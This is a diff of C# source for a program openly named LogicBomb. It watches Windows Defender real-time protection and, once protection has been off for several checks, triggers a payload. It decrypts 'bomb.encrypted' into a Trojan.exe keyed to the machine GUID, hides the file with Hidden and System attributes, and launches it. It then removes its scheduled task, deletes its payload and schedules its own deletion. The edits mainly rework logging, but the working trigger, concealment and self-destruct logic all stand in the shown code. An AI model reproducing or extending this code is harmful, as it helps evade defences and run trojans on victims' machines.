@@ -15,7 +15,6 @@ namespace LogicBomb
         private static readonly string ExecutableBaseDir = AppDomain.CurrentDomain.BaseDirectory;
         private static readonly string ResultDir = Path.Combine(ExecutableBaseDir, "result");
 
-        private const string MarkerName = "activated.txt";
         private const string EncryptedBombName = "bomb.encrypted";
         private const string DecryptedTrojanName = "Trojan.exe";
         private const string LOGICBOMB_TASK_NAME = "MaliciousLogicBomb_Monitor";
@@ -30,23 +29,32 @@ namespace LogicBomb
 
         static void Main(string[] args)
         {
-            Console.WriteLine("[LogicBomb] START (Polymorphic + Defender Monitor) - Press Ctrl+C to stop");
             Directory.CreateDirectory(ResultDir);
-            logFile = Path.Combine(ResultDir, "logicbomb_log.jsonl");
 
-            LogEvent("startup", ExecutableBaseDir, "process_started",
-                $"PID:{Process.GetCurrentProcess().Id},User:{Environment.UserName}");
+            // --- MODIFIED: Create timestamped log file name ---
+            string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
+            string logFileName = $"LogicBomb_log_{timestamp}.txt";
+            logFile = Path.Combine(ResultDir, logFileName);
+
+            Console.WriteLine("[LogicBomb] START (Polymorphic + Defender Monitor) - Press Ctrl+C to stop");
+            LogToFile("======================================================");
+            LogToFile($"[STARTUP] Process started. PID:{Process.GetCurrentProcess().Id}, User:{Environment.UserName}");
+            LogToFile($"[STARTUP] Base Directory: {ExecutableBaseDir}");
+            LogToFile($"[STARTUP] Log file created at: {logFile}");
+            LogToFile("======================================================");
+
 
             Console.CancelKeyPress += (s, e) =>
             {
                 Console.WriteLine("[LogicBomb] Stopping...");
+                LogToFile("[SHUTDOWN] Ctrl+C detected. Shutting down monitor.");
                 e.Cancel = true;
                 cts.Cancel();
             };
 
-            Console.WriteLine($"[LogicBomb] Monitoring Windows Defender Real-Time Protection");
-            Console.WriteLine($"[LogicBomb] Check interval: {CheckIntervalSeconds} seconds");
-            Console.WriteLine($"[LogicBomb] Trigger after {ConsecutiveChecksRequired} consecutive 'disabled' checks");
+            LogInfo($"Monitoring Windows Defender Real-Time Protection");
+            LogInfo($"Check interval: {CheckIntervalSeconds} seconds");
+            LogInfo($"Trigger after {ConsecutiveChecksRequired} consecutive 'disabled' checks");
             Console.WriteLine();
 
             try
@@ -58,6 +66,7 @@ namespace LogicBomb
                 cts?.Dispose();
             }
 
+            LogToFile("[SHUTDOWN] Program exiting.");
             Console.WriteLine("[LogicBomb] Exiting.");
         }
 
@@ -73,14 +82,12 @@ namespace LogicBomb
                     {
                         if (realtimeProtectionEnabled)
                         {
-                            LogWarning("Windows Defender Real-Time Protection is now ENABLED");
-                            LogEvent("realtime_protection", "RTP", "status_change", "enabled");
+                            LogSuccess("Windows Defender Real-Time Protection is now ENABLED");
                             consecutiveDownChecks = 0;
                         }
                         else
                         {
                             LogWarning("Windows Defender Real-Time Protection is now DISABLED");
-                            LogEvent("realtime_protection", "RTP", "status_change", "disabled");
                         }
                         lastRealtimeProtectionStatus = realtimeProtectionEnabled;
                     }
@@ -88,21 +95,22 @@ namespace LogicBomb
                     if (!realtimeProtectionEnabled)
                     {
                         consecutiveDownChecks++;
-                        Console.WriteLine($"[LogicBomb] Real-Time Protection disabled - Check {consecutiveDownChecks}/{ConsecutiveChecksRequired}");
+                        LogInfo($"Real-Time Protection disabled - Check {consecutiveDownChecks}/{ConsecutiveChecksRequired}");
 
                         if (consecutiveDownChecks >= ConsecutiveChecksRequired)
                         {
                             LogWarning($"Real-Time Protection has been disabled for {ConsecutiveChecksRequired} consecutive checks. TRIGGERING PAYLOAD!");
-                            LogEvent("trigger", "RTP", "trigger_activated", $"rtp_disabled_{ConsecutiveChecksRequired}_checks");
+                            LogToFile($"[TRIGGER] Trigger activated: RTP was disabled for {ConsecutiveChecksRequired} consecutive checks.");
 
                             TriggerPayload();
-                            break;
+                            break; // Exit the monitoring loop
                         }
                     }
                     else
                     {
                         if (consecutiveDownChecks > 0)
                         {
+                            // Reset counter if RTP is re-enabled
                             consecutiveDownChecks = 0;
                         }
                     }
@@ -112,12 +120,11 @@ namespace LogicBomb
             }
             catch (TaskCanceledException)
             {
-                Console.WriteLine("[LogicBomb] Monitoring cancelled.");
+                LogInfo("Monitoring cancelled.");
             }
             catch (Exception ex)
             {
                 LogError($"Monitor loop error: {ex.Message}");
-                LogEvent("error", "monitor_loop", "exception", ex.Message);
             }
         }
 
@@ -132,16 +139,14 @@ namespace LogicBomb
                         var rtpEnabled = queryObj["RealTimeProtectionEnabled"];
                         if (rtpEnabled != null)
                         {
-                            bool enabled = Convert.ToBoolean(rtpEnabled);
-                            return enabled;
+                            return Convert.ToBoolean(rtpEnabled);
                         }
                     }
                 }
             }
             catch (ManagementException mex)
             {
-                LogWarning($"WMI query failed: {mex.Message}");
-
+                LogWarning($"WMI query failed, falling back to registry. Error: {mex.Message}");
                 try
                 {
                     using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"))
@@ -151,8 +156,8 @@ namespace LogicBomb
                             object disableValue = key.GetValue("DisableRealtimeMonitoring");
                             if (disableValue != null)
                             {
-                                int disabled = Convert.ToInt32(disableValue);
-                                return disabled == 0;
+                                // Returns true if the 'disable' value is 0
+                                return Convert.ToInt32(disableValue) == 0;
                             }
                         }
                     }
@@ -165,24 +170,21 @@ namespace LogicBomb
             catch (Exception ex)
             {
                 LogError($"Failed to check Real-Time Protection: {ex.Message}");
-                LogEvent("error", "RTP", "check_failed", ex.Message);
             }
 
-            LogWarning("Could not determine RTP status, assuming enabled");
-            return true;
+            LogWarning("Could not determine RTP status, assuming enabled as a safeguard.");
+            return true; // Default to true to prevent accidental triggers
         }
 
         private static void TriggerPayload()
         {
             try
             {
-                Console.WriteLine("[LogicBomb] === PAYLOAD TRIGGERED ===");
-                LogEvent("trigger_start", ExecutableBaseDir, "payload_activation", null);
+                LogInfo("=== PAYLOAD TRIGGERED ===");
+                LogToFile("[PAYLOAD] Payload activation sequence started.");
 
-                string markerPath = Path.Combine(ResultDir, MarkerName);
-                File.WriteAllText(markerPath,
-                    $"Activated by Windows Defender Real-Time Protection being disabled at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
-                Console.WriteLine("[LogicBomb] Created marker: " + markerPath);
+                // --- MODIFIED: Log trigger event to file instead of creating a marker file ---
+                LogToFile($"[PAYLOAD] Trigger reason: Windows Defender Real-Time Protection was disabled at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
 
                 string machineGuid = CryptoUtils.GetMachineGuid();
                 LogInfo($"Local Machine GUID: {machineGuid}");
@@ -194,22 +196,19 @@ namespace LogicBomb
                 {
                     try
                     {
-                        Console.WriteLine($"[LogicBomb] Found encrypted payload: {encryptedBombPath}");
-
+                        LogInfo($"Found encrypted payload: {encryptedBombPath}");
                         string decryptedTrojanPath = Path.Combine(ResultDir, DecryptedTrojanName);
                         CryptoUtils.DecryptFile(encryptedBombPath, decryptedTrojanPath, machineGuid);
 
-                        Console.WriteLine($"[LogicBomb] Decrypted payload to: {decryptedTrojanPath}");
-                        LogEvent("decrypted", encryptedBombPath, "decrypted_to", decryptedTrojanPath);
+                        LogSuccess($"Decrypted payload to: {decryptedTrojanPath}");
+                        LogToFile($"[PAYLOAD] Decrypted '{encryptedBombPath}' to '{decryptedTrojanPath}'.");
 
                         if (File.Exists(decryptedTrojanPath))
                         {
-                            // Set Trojan.exe as Hidden + System
                             try
                             {
                                 File.SetAttributes(decryptedTrojanPath, FileAttributes.Hidden | FileAttributes.System);
                                 LogSuccess($"Set attributes for {DecryptedTrojanName} to Hidden+System");
-                                LogEvent("attributes_set", decryptedTrojanPath, "set_hidden_system", null);
                             }
                             catch (Exception ex)
                             {
@@ -217,37 +216,32 @@ namespace LogicBomb
                             }
 
                             executableToRun = decryptedTrojanPath;
-                            Console.WriteLine($"[LogicBomb] Trojan.exe ready for execution");
+                            LogInfo($"Trojan.exe is ready for execution");
                         }
                         else
                         {
-                            Console.WriteLine($"[LogicBomb] Trojan.exe not found after decryption");
-                            LogEvent("error", decryptedTrojanPath, "decryption_result_missing", null);
+                            LogError($"Trojan.exe not found after decryption attempt.");
                         }
                     }
                     catch (System.Security.Cryptography.CryptographicException ex)
                     {
-                        Console.WriteLine("[LogicBomb] Decryption failed: " + ex.Message);
-                        LogEvent("error", encryptedBombPath, "decrypt_failed", ex.Message);
-                        executableToRun = null;
+                        LogError("Decryption failed. The Machine GUID may be incorrect or the file is corrupt.");
+                        LogToFile($"[ERROR] Decryption failed: {ex.Message}");
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine("[LogicBomb] Error processing encrypted payload: " + ex.Message);
-                        LogEvent("error", encryptedBombPath, "processing_failed", ex.Message);
-                        executableToRun = null;
+                        LogError($"Error processing encrypted payload: {ex.Message}");
                     }
                 }
                 else
                 {
-                    Console.WriteLine($"[LogicBomb] {EncryptedBombName} not found in program directory.");
-                    LogEvent("error", ExecutableBaseDir, "no_encrypted_bomb", null);
+                    LogError($"{EncryptedBombName} not found in program directory.");
                 }
 
                 if (executableToRun != null)
                 {
-                    Console.WriteLine("[LogicBomb] Launching: " + executableToRun);
-                    LogEvent("final", executableToRun, "about_to_launch", "payload launching");
+                    LogInfo($"Launching: {executableToRun}");
+                    LogToFile($"[PAYLOAD] About to launch payload: {executableToRun}");
 
                     var psi = new ProcessStartInfo
                     {
@@ -260,26 +254,24 @@ namespace LogicBomb
                     try
                     {
                         Process.Start(psi);
-                        LogEvent("launched", executableToRun, "launched", null);
-                        Console.WriteLine("[LogicBomb] Trojan.exe started.");
+                        LogSuccess("Trojan.exe started successfully.");
+                        LogToFile($"[PAYLOAD] Launched executable: {executableToRun}");
 
                         CleanupAndExit();
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine("[LogicBomb] Error launching executable: " + ex.Message);
-                        LogEvent("error", executableToRun, "launch_failed", ex.Message);
+                        LogError($"Error launching executable: {ex.Message}");
                     }
                 }
                 else
                 {
-                    LogError("Payload trigger failed - no executable to run");
+                    LogError("Payload trigger failed - no executable to run.");
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[LogicBomb] TriggerPayload error: " + ex.Message);
-                LogEvent("error", "trigger_payload", "exception", ex.Message);
+                LogError($"A critical error occurred in TriggerPayload: {ex.Message}");
             }
         }
 
@@ -287,8 +279,8 @@ namespace LogicBomb
         {
             try
             {
-                LogEvent("cleanup", "self", "starting_cleanup", "self-destruct initiated");
-                Console.WriteLine("[LogicBomb] Starting self-destruct sequence...");
+                LogInfo("Starting self-destruct sequence...");
+                LogToFile("[CLEANUP] Self-destruct sequence initiated.");
 
                 DeleteScheduledTask(LOGICBOMB_TASK_NAME);
 
@@ -296,8 +288,8 @@ namespace LogicBomb
                 if (File.Exists(bombPath))
                 {
                     File.Delete(bombPath);
-                    Console.WriteLine("[LogicBomb] Deleted bomb.encrypted");
-                    LogEvent("cleanup", bombPath, "deleted", "encrypted payload removed");
+                    LogInfo("Deleted bomb.encrypted");
+                    LogToFile($"[CLEANUP] Deleted encrypted payload: {bombPath}");
                 }
 
                 string selfPath = Process.GetCurrentProcess().MainModule.FileName;
@@ -312,16 +304,15 @@ namespace LogicBomb
                 };
 
                 Process.Start(psi);
-                Console.WriteLine("[LogicBomb] Self-deletion scheduled");
-                LogEvent("cleanup", selfPath, "self_delete_scheduled", "LogicBomb will be deleted in 2 seconds");
+                LogInfo("Self-deletion scheduled.");
+                LogToFile($"[CLEANUP] Self-deletion scheduled for '{selfPath}' in 2 seconds.");
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[LogicBomb] Cleanup error: " + ex.Message);
-                LogEvent("error", "cleanup", "failed", ex.Message);
+                LogError($"Cleanup error: {ex.Message}");
             }
 
-            Console.WriteLine("[LogicBomb] Exiting now. Trojan is running.");
+            LogInfo("Exiting now. The trojan is running.");
             Environment.Exit(0);
         }
 
@@ -342,75 +333,65 @@ namespace LogicBomb
 
                 using (Process process = Process.Start(psi))
                 {
-                    string output = process.StandardOutput.ReadToEnd();
                     string error = process.StandardError.ReadToEnd();
                     process.WaitForExit();
 
                     if (process.ExitCode == 0)
                     {
-                        Console.WriteLine($"[LogicBomb] Deleted scheduled task: {taskName}");
-                        LogEvent("cleanup", taskName, "task_deleted", "persistence removed");
+                        LogSuccess($"Deleted scheduled task: {taskName}");
                     }
                     else
                     {
-                        Console.WriteLine($"[LogicBomb] Failed to delete task: {error}");
-                        LogEvent("cleanup", taskName, "task_delete_failed", error);
+                        // This might not be an error if the task never existed, so log as info
+                        LogInfo($"Could not delete scheduled task '{taskName}'. It may not exist. Details: {error}");
+                        LogToFile($"[CLEANUP] Note: Failed to delete scheduled task '{taskName}': {error}");
                     }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[LogicBomb] Error deleting task: {ex.Message}");
-                LogEvent("error", taskName, "task_delete_exception", ex.Message);
+                LogError($"Error deleting scheduled task: {ex.Message}");
             }
         }
 
-        private static void LogEvent(string type, string path, string ev, string note)
+        // --- NEW: Central method for writing to the log file ---
+        private static void LogToFile(string message)
         {
             try
             {
-                var obj = new Dictionary<string, string>
-                {
-                    ["timestamp"] = DateTime.UtcNow.ToString("o"),
-                    ["type"] = type ?? "unknown",
-                    ["event"] = ev ?? "none",
-                    ["path"] = path ?? "null",
-                    ["note"] = note ?? "none"
-                };
-                string json = "{ " + string.Join(", ", obj.Select(kv => $"\"{kv.Key}\": \"{Escape(kv.Value)}\"")) + " }";
+                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                string logEntry = $"[{timestamp}] {message}";
 
                 int retries = 3;
                 while (retries > 0)
                 {
                     try
                     {
-                        File.AppendAllText(logFile, json + Environment.NewLine);
-                        break;
+                        File.AppendAllText(logFile, logEntry + Environment.NewLine);
+                        return; // Exit method on success
                     }
                     catch (IOException) when (retries > 1)
                     {
                         retries--;
-                        Thread.Sleep(50);
+                        Thread.Sleep(50); // Wait briefly if file is locked
                     }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[LogicBomb] Logging failed: {ex.Message}");
+                // If logging fails, write to console as a last resort
+                Console.WriteLine($"[CRITICAL LOGGING FAILURE]: {ex.Message}");
             }
         }
 
-        private static string Escape(string s)
-        {
-            return s?.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n") ?? "";
-        }
-
+        // --- MODIFIED: Console logging methods now also write to the log file ---
         private static void LogInfo(string message)
         {
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.Write("[INFO] ");
             Console.ResetColor();
             Console.WriteLine(message);
+            LogToFile($"[INFO] {message}");
         }
 
         private static void LogSuccess(string message)
@@ -419,6 +400,7 @@ namespace LogicBomb
             Console.Write("[SUCCESS] ");
             Console.ResetColor();
             Console.WriteLine(message);
+            LogToFile($"[SUCCESS] {message}");
         }
 
         private static void LogWarning(string message)
@@ -427,6 +409,7 @@ namespace LogicBomb
             Console.Write("[WARNING] ");
             Console.ResetColor();
             Console.WriteLine(message);
+            LogToFile($"[WARNING] {message}");
         }
 
         private static void LogError(string message)
@@ -435,6 +418,7 @@ namespace LogicBomb
             Console.Write("[ERROR] ");
             Console.ResetColor();
             Console.WriteLine(message);
+            LogToFile($"[ERROR] {message}");
         }
     }
 }
